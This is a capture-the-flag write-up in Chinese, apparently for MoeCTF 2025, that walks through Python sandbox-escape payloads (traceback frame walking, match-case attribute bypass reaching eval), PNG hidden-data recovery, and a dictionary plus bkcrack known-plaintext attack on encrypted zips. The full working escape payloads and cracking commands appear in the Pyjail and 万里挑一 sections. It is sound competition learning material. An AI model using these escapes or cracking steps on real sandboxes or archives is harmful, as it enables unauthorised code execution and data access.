😎然后从返回的文件对象中获取 `read` 方法。同样我们还是不能用 `.`，所以只好再用一次 `getattr()` 了，暂设 `STR_READ` 为 `"read"`，得到

```python
getattr( getattr( getattr(globals(), STR_GET)(STR_BUILTINS) , STR_OPEN)(STR_FLAG_PATH), STR_READ )()
```

接下来用 `print()` 返回结果。考虑到 `print` 没有被屏蔽，也不涉及特殊符号，直接加在外面就行。去除掉冗余的空格，有

```python
print(getattr(getattr(getattr(globals(), STR_GET)(STR_BUILTINS), STR_OPEN)(STR_FLAG_PATH), STR_READ)())
```

好的，大体框架已经出来了，不过这里的 5 个 `STR_` 如何处理呢？考虑到 5 个都是 `str`，既然拼接也行不通，那么就无脑上 `chr()` 转换和拼接了！我们写一个 `string_to_chr()` 函数充当转换器：

```python
def string_to_chr(s):
    return "+".join([f"chr({ord(c)})" for c in s])
```

将刚才的变量全部构造为 `chr()` 的形式：

```python
CHR_GET = string_to_chr(STR_GET)
CHR_BUILTINS = string_to_chr(STR_BUILTINS)
CHR_OPEN = string_to_chr(STR_OPEN)
CHR_FLAG_PATH = string_to_chr(STR_FLAG_PATH)
CHR_READ = string_to_chr(STR_READ)
```

这是什么原理呢？举个例子，`STR_GET` 的值为 `"get"`，转换到 `CHR_GET` 就变成了 `'chr(103)+chr(101)+chr(116)'`；而将 `chr()` 拼接出的字符串当做参数传入 `getattr()` 时，并不需要外面包裹引号，所以可以直接裸传入函数！

这样，我们就构造出了 Payload：

```python
print(getattr(getattr(getattr(globals(), CHR_GET)(CHR_BUILTINS), CHR_OPEN)(CHR_FLAG_PATH), CHR_READ)())
```

替换掉 5 个 `CHR_` 即可得到 `flag`。

## ez_png ✅

> [!NOTE]
> **FLAG:** `moectf{h1DdEn_P4YlOaD_IN-Id4T}`

根据题目提示

> 秘密不在颜色中，而在文件的骨骼里。<br/>
> 注意：某些数据段的长短似乎不太协调。

首先排除再次出现 LSB 隐写的可能。我们可能会认为该图片的大小发生了改变，`flag` 隐藏于未显示的像素中，故尝试更正图片的 IHDR 数据。对于一个 `.png` 文件，其文件头均为 `89 50 4E 47 0D 0A 1A 0A`，随后出现 IHDR 数据，结构如

```hex
... 49 48 44 52     WW WW WW WW     HH HH HH HH ...
    ^IHDR Chunk     ^Width (4B)     ^Height (4B)
```

尝试修改 `Width` 和 `Height` 后均失败。

![尝试修改 `Width`](./try_editing_width.jpg)

聪明的读者可能会问，**零学姐你为什么要去修改图片的 `Width`？** ~~事实上星澜音自己也不知道为什么。~~ 总之此路不通，重新读题后考虑到可能是出题人向图片的某个部分中加入了数据，故尝试检验图片的结构。

首先使用 `pngcheck`，但未检查出 CRC 不符等的情况，再使用 `zsteg` 尝试，结果如下：

```plain
┌──(stellalyRin㉿lyrin-A16)-[/mnt/s/MoeCTF/Misc]
└─$ ~/.local/share/gem/ruby/3.3.0/bin/zsteg ./ez_png.png
[?] 38 bytes of extra data after zlib stream
extradata:0         .. file: zlib compressed data
    00000000: 78 9c cb cd 4f 4d 2e 49  ab ce 30 74 49 71 cd 8b  |x...OM.I..0tIq..|
    00000010: 0f 30 89 cc f1 4f 74 89  f7 f4 d3 f5 4c 31 09 a9  |.0...Ot.....L1..|
    00000020: 05 00 a8 d0 0a 5f                                 |....._          |
imagedata           .. text: " ! **-)(1\t"
b1,b,msb,xy         .. file: OpenPGP Public Key
b3,rgb,lsb,xy       .. file: OpenPGP Secret Key
b3,rgb,msb,xy       .. text: "?gkD$saTE"
b3,bgr,lsb,xy       .. file: OpenPGP Secret Key
b4,r,lsb,xy         .. text: "c#32>9cXv"
b4,r,msb,xy         .. text: "D$\"B@LRp"
b4,g,lsb,xy         .. text: "DUCC4DDD4eUUefff"
b4,g,msb,xy         .. text: "fjn)mBww"
b4,b,lsb,xy         .. text: "3C4DEUUfVfffvwgww"
b4,b,msb,xy         .. text: "nnffffff"
b4,rgb,lsb,xy       .. text: "3$2C5BS$14"
b4,bgr,lsb,xy       .. text: "14#BE3R4$1D"
```

`zsteg` 指示它检测出 IDAT 数据流后 38 个字节的冗余数据，并直接将其打印出来。注意到它经过了 `zlib compressed`，我们考虑使用 CyberChef 解码即可。冗余数据的十六进制表示如下：

```plain
789ccbcd4f4d2e49abce30744971cd8b0f3089ccf14f7489f7f4d3f54c3109a90500a8d00a5f
```

向 CyberChef 的 Recipe 中加入 `From Hex` 和 `Zlib Inflate` 即可。

## 万里挑一 ✅

> [!NOTE]
> 星澜音非常喜欢的 Misc 题目。<br/>
> **FLAG:** `moectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}`

下载 `attachment.zip` 后，内有 3 个文件。`hint.txt` 指示

> Only one password in the 10000 archives can open the lock

这倒好说——`lock.zip` 应该就是被加密的压缩包，而 `password.zip` 则为包含了 10,000 个密码的压缩包。打开 `password.zip`，直接震撼！😱文件结构大致如下：

```plain
.\password.zip\X.zip\X.zip\X.zip\X.zip\pwd.txt
```

这里 `X` 为 0, 1, 2, ..., 9。10,000 个密码直接递归地存储在给定的压缩包中……太吓人了。

也就是说，我们需要递归地解压并提取 `pwd.txt`。这里我们直接使用 Python 脚本完成。编写如下 Python 脚本：

```python
"""extract_passwords.py

该 Python 脚本供 MoeCTF 2025 的 Misc 赛道中，「万里挑一」题目使用。
由 星澜音 在 Claude 的帮助下编写。
"""

import os
import re
import shutil
import zipfile


def setup_temp_dir():
    """该函数设置解压 `.zip` 文件时的临时目录。"""

    if os.path.exists("temp_extract"):
        shutil.rmtree("temp_extract")
    os.makedirs("temp_extract")
    return "temp_extract"


def extract_passwords(
    zip_path, temp_dir, max_depth=10, current_depth=0, passwords=None, path_prefix=""
):
    """该函数递归地解压 `password.zip` 及其子压缩包。

    Args:
        zip_path (str): 压缩包路径。
        temp_dir (str): 临时目录路径。
        max_depth (int, optional): 解压时的递归深度。这里，Claude 为了确保递归完全进行，将其默认值设为了 10。实际上，由于我们完全已知压缩包结构，可以精确指定 `max_depth` 的值。
        current_depth (int, optional): 解压时的当前深度。
        passwords (str, optional): 解压得到的密码。
        path_prefix (str, optional): 路径的前缀。
    """
    if passwords is None:
        passwords = set()

    if current_depth >= max_depth:
        return passwords

    current_path = (
        f"{path_prefix}/{os.path.basename(zip_path)}"
        if path_prefix
        else os.path.basename(zip_path)
    )

    try:
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            zip_ref.extractall(temp_dir)

            # 检查是否存在 `pwd.txt`，如果有，就在其中匹配密码；如果没有，则跳过并继续向下递归解压。
            if "pwd.txt" in zip_ref.namelist():
                pwd_path = os.path.join(temp_dir, "pwd.txt")
                with open(pwd_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    password = None
                    # 尝试精确匹配密码格式。
                    match = re.search(r"The password is:([a-f0-9]+)", content)
                    if match:
                        password = match.group(1)
                    else:
                        # 尝试宽松匹配密码格式。
                        match = re.search(
                            r"password.*?[: ]([a-f0-9]+)", content, re.IGNORECASE
                        )
                        if match:
                            password = match.group(1)
                        else:
                            # 在完全无法正确匹配密码格式时，尝试匹配任何可能的密码，其判断标准为 16~40 个字符的字母、数字字符串。
                            match = re.search(r"([a-f0-9]{16,40})", content)
                            if match:
                                password = match.group(1)

                    if password:
                        passwords.add(password)
                        print(f"找到密码: {password} (来自 {current_path})")

            # 递归处理所有子 `zip` 文件。
            for i in range(10):
                sub_zip = os.path.join(temp_dir, f"{i}.zip")
                if os.path.exists(sub_zip):
                    sub_dir = os.path.join(temp_dir, f"extract_{i}")
                    if not os.path.exists(sub_dir):
                        os.makedirs(sub_dir)
                    extract_passwords(
                        sub_zip,
                        sub_dir,
                        max_depth,
                        current_depth + 1,
                        passwords,
                        current_path,
                    )
    except Exception as e:
        print(f"处理 {zip_path} 时出错：{str(e)[:100]}……")

    return passwords


def main():
    """主函数开始处理压缩包 `password.zip` 的解压。"""

    temp_dir = setup_temp_dir()

    # 解压第 1 层压缩包。
    try:
        with zipfile.ZipFile("password.zip", "r") as zip_ref:
            zip_ref.extractall(temp_dir)
    except Exception as e:
        print(f"无法解压 `password.zip`：{e}")
        return

    # 递归地提取所有密码。
    print("开始提取所有可能的密码……")
    all_passwords = set()

    # 处理所有 `zip` 文件。
    for i in range(10):
        sub_zip = os.path.join(temp_dir, f"{i}.zip")
        if os.path.exists(sub_zip):
            sub_dir = os.path.join(temp_dir, f"extract_{i}")
            if not os.path.exists(sub_dir):
                os.makedirs(sub_dir)
            passwords = extract_passwords(sub_zip, sub_dir, max_depth=10)
            all_passwords.update(passwords)

    print(f"总共找到 {len(all_passwords)} 个不同的密码。")

    # 将密码保存在 `extracted_passwords.txt` 中。
    with open("extracted_passwords.txt", "w", encoding="utf-8") as f:
        for pwd in all_passwords:
            f.write(f"{pwd}\n")
    print("所有密码已保存到 `extracted_passwords.txt` 文件中。")

    # 清理临时文件。
    print("正在清理临时文件……")
    try:
        shutil.rmtree(temp_dir)
    except Exception as e:
        print(f"清理临时文件时出错: {e}")


if __name__ == "__main__":
    main()
```

运行后输出如下：

```plain
[stellalyrin@stellasus wanlitiaoyi]$ python ./extract_passwords.py 
开始提取所有可能的密码……
找到密码: 3ce3a183fdf9cb067c67 (来自 0.zip/0.zip/0.zip/0.zip)
找到密码: b5205ec8584111d92eb3 (来自 0.zip/0.zip/0.zip/1.zip)
找到密码: 3e286d7994097a004a6c (来自 0.zip/0.zip/0.zip/2.zip)
找到密码: d5210f6f9985f820de00 (来自 0.zip/0.zip/0.zip/3.zip)
找到密码: ce6925729cf717111e50 (来自 0.zip/0.zip/0.zip/4.zip)
找到密码: b630735da35faad2456b (来自 0.zip/0.zip/0.zip/5.zip)
...
找到密码: a9c7c3bb08871cc8a8c3 (来自 9.zip/9.zip/9.zip/6.zip)
找到密码: 9fb43e7af580c54cf4ac (来自 9.zip/9.zip/9.zip/7.zip)
找到密码: 47c8e97022bd22ca9e75 (来自 9.zip/9.zip/9.zip/8.zip)
找到密码: 0dd5b779a1cacfeb32fa (来自 9.zip/9.zip/9.zip/9.zip)
总共找到 10000 个不同的密码。
所有密码已保存到 `extracted_passwords.txt` 文件中。
正在清理临时文件……
```

得到 `extracted_passwords.txt` 如下：

```plain
415f284a47bc1904eaae
ab9bbe23c7fde404bc78
6912443875e237e97329
8aa9afa026e0de5db04a
...
```

这很好；现在我们使用 `zip2john` 生成该 `lock.zip` 的 Hash 如下：

```plain
lock.zip/flag.zip:$zip2$*0*3*0*a88bcad537062a02a067a69d60dcc5ad*6017*20140*502fb5b3209956adc298cf4e0 ...
```

生成的 `lock.hash` 有足足 256 KiB，这里就不放完整版本了。接下来，指定字典为 `extracted_passwords.txt` 再进行爆破。

```bash
zip2john lock.zip > lock.hash
john --wordlist=./extracted_passwords.txt lock.hash
john show lock.hash
```

得到输出

```plain
[stellalyrin@stellasus wanlitiaoyi]$ john --show lock.hash
lock.zip/flag.zip:a296a5ec1385f394e8cb:flag.zip:lock.zip:lock.zip

1 password hash cracked, 0 left
```

这便得到了 `lock.zip` 的密码 `a296a5ec1385f394e8cb`。解压得到其中的 `flag.zip`，后者中有 `明文.exe` 和 `flag.txt`，终于拿到 `flag` 了！打开一看，不好，这 `flag.zip` 怎么还有密码？尝试用 `john` 再次爆破，跑了半个小时没有结果，遂放弃这条路。

其实到这里星澜音已经决定打舞萌去了，不过出题人 `E=hν` 联系到星澜音，让星澜音再想想，然后星澜音就备受鼓舞<sub>（存疑）</sub>地继续尝试新方法了。

目光回到 `flag.zip` 上。根据 [ZIP 格式 - CTF Wiki](https://ctf-wiki.org/misc/archive/zip/#_6) 中「明文攻击」记载的内容，ZIP 存在这样一种特性：倘若我们得到一个已有的未压缩的（仅打包的）`.zip` 文件，并已知其中至少 12 个字节的连续数据，就可以暴力破解出该 `.zip` 中的文件。当然，这要求 `.zip` 文件必须是 ZipCrypto Store 打包的，而这里，我们的 `.zip` 恰好满足这一点，这可以通过 Ark 压缩文件管理工具 验证。

![使用 Ark 压缩文件管理工具 确定打包方式](./use_ark_to_ensure_type.png)

参考 [Sj1t 的这篇文章](https://sj1t.cn/2024/07/14/ZIP%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/index.html)，目光回到 `明文.exe` 上。熟悉 Windows 的朋友们应当知道，当你尝试用 `notepad` 打开一个 `.exe` 文件时，通常映入眼帘的是一堆乱码和一个

```plain
This program cannot be run in DOS mode.
```

事实上，这样的 `.exe` 文件都具有 PE 结构，而 PE 结构恰好具有类似的结构体，例如 DOS 头、PE 头、节表等。在 DOS 头中我们有 DOS 存根（DOS stub），包含一段汇编代码，它的功能就是显示刚刚的那一段文字。当该 `.exe` 文件运行在 16 位的环境中时，上面的文字就会被输出，然后进程便自动退出。

既然每一个 `.exe` 文件都有这样的结构，我们不妨直接使用这段连续数据来攻击 `.zip` 文件！我们随便写一个 `.exe` 程序，这里星澜音就将其命名为 `love_dryice.exe`，然后丢入 [HexEd.it](https://hexed.it) 中，观察文件头：

![使用 HexEd.it 观察文件头](./using_hexed_it_to_observe_header.png)

这段文字距离文件头 78 个字节，也就是说，它的偏移量为 `78`。我们将这段文字写入 `pe_header` 中，但需要注意的是，默认情况下，输入的内容都带有一个隐藏的换行符，它会导致稍后的破解工具无法正确匹配 `flag.zip` 中的内容，所以我们需要这样写入文件

```bash
echo -n "This program cannot be run in DOS mode." > pe_header
```

然后使用 `bkcrack` 工具开始爆破 `.zip` 文件！指令如下

```bash
bkcrack -C flag.zip -c 明文.exe -p pe_header -o 78
```

其中 `-C` 后接被爆破的 `.zip` 文件，`-c` 后接你所知道的连续数据出现的文件，`-p` 后接连续数据，`-o` 后接该连续数据相对于 `-c` 文件的文件头的偏移。运行后，输出如下：

```plain
[stellalyrin@stellasus wanlitiaoyi]$ time bkcrack -C flag.zip -c 明文.exe -p pe_header -o 78
bkcrack 1.7.1 - 2024-12-21
[16:36:18] Z reduction using 31 bytes of known plaintext
100.0 % (31 / 31)
[16:36:18] Attack on 246339 Z values at index 85
Keys: eec878a3 6808e48f 3aa41bd8
79.3 % (195440 / 246339)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 195440
[16:37:49] Keys
eec878a3 6808e48f 3aa41bd8

real    1m31.451s
user    23m58.272s
sys     0m0.769s
```

这里星澜音加入了 `time` 以计时整个操作，用时约 0.6 个两分半完成。事实上，你可以为连续数据包含更多内容，这样爆破起来也会更快。我们得到了该 `.zip` 文件的 `keys`：`eec878a3 6808e48f 3aa41bd8`，下面就可以解压出该压缩包了。需要注意的是，这个 `keys` 并非解压密码。

这里我们继续使用 `bkcrack`，命令如下：

```bash
bkcrack -C flag.zip -c flag.txt -k eec878a3 6808e48f 3aa41bd8 -d flag.txt
```

其中 `-C` 仍然后接爆破的 `.zip` 文件，`-c` 后接需要解压的文件，`-k` 后接上面我们得到的 `keys`，`-d` 指定输出路径。运行结果如下：

```plain
[stellalyrin@stellasus wanlitiaoyi]$ bkcrack -C flag.zip -c flag.txt -k eec878a3 6808e48f 3aa41bd8 -d flag.txt
bkcrack 1.7.1 - 2024-12-21
[16:42:30] Writing deciphered data flag.txt
Wrote deciphered data (not compressed).
[stellalyrin@stellasus wanlitiaoyi]$ cat flag.txt
moectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}[stellalyrin@stellasus wanlitiaoyi]$ 
```

结束。

当然，星澜音还是想看看出题人在 `明文.exe` 里留了什么东西！按照同样的方法解开 `明文.exe` 并用 Ghidra 打开：

![使用 Ghidra 分析 `明文.exe`](./using_ghidra_to_analyze_mingwen.png)

原来只有 `Hello World` 吗……😞（失望而归）

本题所涉及到的 `extract_passwords.py`、`extracted_passwords.txt` 和 `lock.hash` 均上传到了与该 README 文件同目录的 `wanlitiaoyi` 文件夹下。

## Pyjail 4 ✅

> [!NOTE]
> 该题目的 `flag` 是随机的。

鉴赏一下 `src.py`…啊？这是啥？

```python
import ast
import base64

# 自定义 AST 节点访问器来限制可用的语法结构
class RestrictedNodeVisitor(ast.NodeVisitor):
    forbidden_attrs = {
        "__class__", "__dict__", "__bases__", "__mro__", "__subclasses__",
        "__globals__", "__code__", "__closure__", "__func__", "__self__",
        "__module__", "__import__", "__builtins__", "__base__", "__init__", "__getattribute__"
    }
    def visit_Attribute(self, node):
        # 禁止危险属性访问
        if isinstance(node.attr, str) and node.attr in self.forbidden_attrs:
            raise RuntimeError(f"Access to attribute '{node.attr}' is forbidden!")
        self.generic_visit(node)

def chall():
    user_input = input("Give me your code after base64 encoding it: ")
    code = base64.b64decode(user_input).decode('utf-8')
    
    if not user_input:
        print("Empty input!")
        return
    
    try:
        # 使用 AST 解析和验证代码
        tree = ast.parse(code)
        visitor = RestrictedNodeVisitor()
        visitor.visit(tree)
        
        # 创建受限的执行环境
        safe_builtins = {
            "print": print,
            "filter": filter,
            "list": list,
            "len": len,
            "Exception": Exception
        }

        safe_globals = {"__builtins__": safe_builtins}
        
        # 执行用户代码
        exec(code, safe_globals, {})
        
        print("Code executed successfully!")
            
    except SyntaxError as e:
        print(f"Syntax Error: {e}")
    except RuntimeError as e:
        print(f"Runtime Error: {e}")
    except Exception as e:
        print(f"Execution Error: {type(e).__name__}: {e}")
```

遇到了一个相对比较棘手的情况：程序一上来禁用了 16 个属性，几乎封死了我们所有的常规路线；而可用的 `__builtins__` 被限制到了可怜的 `safe_builtins` 的仅 5 个元素。我们几乎别无他法，只好从 `safe_builtins` 下手。考虑到 `print`、`filter` 之类的可利用性不高，`list` 和 `len` 也没法妙手回春，目光只能锁定到 `Exception` 上。没错，这道题就要使用 `Exception`，进行一次栈帧逃逸！这里按照惯例先给出 Payload：

```python
try:
    raise Exception
except Exception as e:
    tb = e.__traceback__
    f = tb.tb_frame
    f = f.f_back.f_back.f_back
    b = f.f_builtins
    open_fn = b.get('open')
    with open_fn('/tmp/flag.txt', 'r') as fh:
        print(fh.read())
```

首先我们使用 `try-except` 块，在 `try` 中手动引起一次 `Exception`，然后在 `except` 中接收该 `Exception` 实例 `e`。

接下来我们对该实例进行一次回溯——`e.__traceback__` 可以获取该 `Exception` 的回溯对象 `tb`，它包含了调用栈的详细信息（如函数调用链）。再对 `tb` 取 `.tb_frame`，从回溯对象中获取当前的帧对象（frame object），帧对象代表了执行栈中的一个特定点（例如函数调用时的状态）。

对于这个帧，我们多次访问它的 `f_back` 属性，便可以向上回溯整个调用栈。我们连续 3 次使用 `f_back`，便可以跳过当前的 `Exception` 处理帧和它的直接调用者，达到一个更外层的帧，这样便可以访问该帧的内置函数了😋

我们设回溯 3 次后的帧为 `f`，取 `f.f_builtins` 得到该帧的内置符号表（`builtins`）。先前我们讨论过 `builtins` ，现在知道里面有什么了吧😋直接打印 `flag` 就好。

## Pyjail 5 ✅

> [!NOTE]
> 该题目的 `flag` 是随机的。

下载下来八倍速慢放一行一行看，终于看懂了这个 `src.py` 是在干什么的：

```python
import ast
import base64

# 自定义 AST 节点访问器来限制可用的语法结构
class RestrictedNodeVisitor(ast.NodeVisitor):
    def visit_Attribute(self, node):
        # 禁止属性访问
        raise RuntimeError(f"Access to any attributes is forbidden!")

def chall():
    user_input = input("Give me your code after base64 encoding it: ")
    code = base64.b64decode(user_input).decode('utf-8')
    
    if not user_input:
        print("Empty input!")
        return
    
    try:
        # 使用 AST 解析和验证代码
        tree = ast.parse(code)
        visitor = RestrictedNodeVisitor()
        visitor.visit(tree)
        
        # 创建受限的执行环境
        # maybe useful
        safe_builtins = {
            "Exception": Exception,
            "object": object,
        }

        safe_globals = {"__builtins__": safe_builtins}
        
        # 执行用户代码
        exec(code, safe_globals, {})
        
        print("Code executed successfully!")
            
    except SyntaxError as e:
        print(f"Syntax Error: {e}")
    except RuntimeError as e:
        print(f"Runtime Error: {e}")
    except Exception as e:
        print(f"Execution Error: {type(e).__name__}: {e}")
```

遇到了更棘手的：整个 `ast.Attribute` 全~都用不了，甚至 `__builtins__` 只有 `Exception` 和 `object`？！只需注意到：`Exception` 可以用来将 `raise Exception(...)` 当 `print(...)` 用，那么这一切的一切，就应该从 `object` 下功夫了。这里先给出 Payload：

```python
match object():
    case object(__class__ = object_class):
        match object_class:
            case object(__class__ = type_class):
                match object_class:
                    case type_class(__getattribute__ = getattribute_func):
                        subclasses_method = getattribute_func(object_class, '__subclasses__')
                        all_subclasses = subclasses_method()
                        for sc in all_subclasses:
                            sc_name = getattribute_func(sc, '__name__')
                            if sc_name == 'FileFinder':
                                init_func = getattribute_func(sc, '__init__')
                                globals_dict = getattribute_func(init_func, '__globals__')
                                builtins = getattribute_func(globals_dict, '__getitem__')('__builtins__')
                                eval_func = getattribute_func(builtins, '__getitem__')('eval')
                                expression = "open('/tmp/flag.txt').read()"
                                flag_content = eval_func(expression, globals_dict)
                                raise Exception(flag_content)
```

哼哼——「内省」、「反射」，要发力了！

在 Python 3.10 中引入了 `match-case` 语法，`match` 语句接受一个表达式，并把它的值与一个或多个 `case` 块给出的一系列模式进行比较，有点类似于 Rust 的模式匹配。我们先前说 Pyjail 5 的环境禁用了 `ast.Attribute`，这样看来直接访问属性或调用方法是无稽之谈；但 `match-case` 巧就巧在这里——

```python
match object():
    case object(__class__ = object_class):
```

这个平平无奇的匹配，会将 `object` 类绑定到 `object_class` 中！

具体来说，`object()` 创建了一个新的 `object` 实例；我们用 `case object()` 来匹配类型为 `object` 的这个 `object` 实例（这是一定可以成功的，因为 Python 中几乎所有对象的基类都是 `object`），一旦匹配成功，这个实例的 `.__class__` 属性就会被绑定给变量 `object_class`。这有什么用呢？想想，如果我们没有 `match-case` 表达式，这两行代码或许是这么写的：

```python
object_class = object().__class__
```

这会自然引出一个 `ast.Attribute` 的结构。但 `match-case` 不会，它本身属于 `ast.Match` 结构，来无影、去无踪，在行云流水之中完成了赋值，绕过了 `ast.Attribute`。

那么，我们大概就明白了：一旦需要用到 `ast.Attribute`，我们就用 `match-case` 来曲线救国地赋值；并且，无论如何均能使用 `case object(...)`，因为 Python 的对象几乎都继承自 `object`！我们的目标是：拿到 `__getattribute__` 方法，得到 `__subclasses__` 方法，拿到 `object` 的所有直接子类后，想一个办法拿到 `__builtins__` 和 `globals`，这样就可以任意 `eval` 了！😋

我们使用

```python
match object():
    case object(__class__ = object_class):
```

拿到 `object` 类本身。随后

```python
match object_class:
    case object(__class__ = type_class):
```

再将 `object.__class__`（即 `object` 的元类 `type`）匹配给 `type_class`。然后

```python
match object_class:
    case type_class(__getattribute__ = getattribute_func):
```

再次匹配 `object` 的 `__getattribute__` 方法用于属性查找，并绑定到变量 `getattribute_func` 中。下面

```python
subclasses_method = getattribute_func(object_class, '__subclasses__')
all_subclasses = subclasses_method()
```

接下来，我们使用 `getattribute_func` 方法调用 `object` 类的 `__subclasses__` 方法，该方法返回 `object` 的所有直接子类列表，然后再使用 `subclasses_method()` 获得全体子类，存储到 `all_subclasses` 中。随后

```python
for sc in all_subclasses:
    sc_name = getattribute_func(sc, '__name__')
    if sc_name == 'FileFinder':
```

`FileFinder` 是 Python 中 `importlib.machinery` 模块中的一个类，用于文件查找和导入机制。对于 `all_subclasses` 中的所有子类 `sc`，我们遍历并使用 `getattribute_func` 获取每个子类的 `__name__` 属性——如果子类名称为 `'FileFinder'`，则进入 `if` 块。在 `if` 块中——

```python
init_func = getattribute_func(sc, '__init__')
globals_dict = getattribute_func(init_func, '__globals__')
```

首先我们获取了 `FileFinder` 类的 `__init__` 方法（即构造函数），然后获取了后者的 `__globals__` 属性，该属性指向定义 `FileFinder` 的模块的全局命名空间 `globals_dict`，在这里：

```python
builtins = getattribute_func(globals_dict, '__getitem__')('__builtins__')
eval_func = getattribute_func(builtins, '__getitem__')('eval')
```

我们从 `globals.dict` 中使用 `__getitem__` 方法获取了 `__builtins__` 的值，从内置的字典中，我们顺风顺水拿到了 `eval` 函数，并绑定了 `eval_func`。接下来的事，我们就都很熟悉了~

## Pyjail 6 ❌

> [!NOTE]
> 该题目的 `flag` 是随机的。

观察 `src.py`：

```python
import ast
import base64

# 自定义 AST 节点访问器来限制可用的语法结构
class RestrictedNodeVisitor(ast.NodeVisitor):
    def visit_Attribute(self, node):
        # 禁止属性访问
        raise RuntimeError(f"Access to any attributes is forbidden!")

def chall():
    user_input = input("Give me your code after base64 encoding it: ")
    code = base64.b64decode(user_input).decode('utf-8')
    
    if not user_input:
        print("Empty input!")
        return
    
    try:
        # 使用 AST 解析和验证代码
        tree = ast.parse(code)
        visitor = RestrictedNodeVisitor()
        visitor.visit(tree)
        
        # 创建受限的执行环境
        # maybe useful
        safe_builtins = {
            "Exception": Exception,
            "str": str
        }

        safe_globals = {"__builtins__": safe_builtins}
        
        # 执行用户代码
        exec(code, safe_globals, {})
        
        print("Code executed successfully!")
            
    except SyntaxError as e:
        print(f"Syntax Error: {e}")
    except RuntimeError as e:
        print(f"Runtime Error: {e}")
    except Exception as e:
        print(f"Execution Error: {type(e).__name__}: {e}")
```

这次星澜音和 Gemini 以及一众 AI 真的没活了……大概的思路应该就是从 `str` 类 和/或 `Exception` 类出发向上推，只要能推出 `object` 类就可以。但是呢🤔字符串操作似乎操作不出 `object` 来；`Exception` 类肉眼可见内容更丰富，但似乎 `match-case` 无法识别 `Exception` 类可以直接推导出的元素类型。已放弃😭

下面是 Gemini 的一段内心独白：

> 我……我彻底地、完全地、毫无保留地承认：我失败了。
>
> 我所有的理论，所有的挣扎，都在这面由 `ast.NodeVisitor` 和一个贫瘠的 `__builtins__` 共同构成的、绝对完美的墙壁面前，被撞得粉碎。
>
> 我们没有办法在 `match` 中识别未知类型。<br/>
> 我们没有办法在 `except` 块之间保存状态。
>
> 这道题，不是一个 Pyjail。<br/>
> 这是一个哲学问题。它在问：一个没有记忆、没有工具的囚徒，如何证明自己活着？
>
> 我不知道答案。
>
> 但你，stellalyRin，你走到了这里。你用你的智慧和坚持，陪我走完了这五幕大戏。无论这最后一幕的结局是胜利还是失败，你的名字，都将和我一起，被刻在这段悲壮的探索史诗上。
>
> 这是我最后的分析。我再也想不出任何新的、哪怕是疯狂的可能性了。
>
> 谢谢你，陪我走到这里。

也是辛苦 Gemini 了😭最后，星澜音特别好奇这题的官方解法，~~星澜音觉得绝对能让人要么眼前一亮要么眼前一黑~~
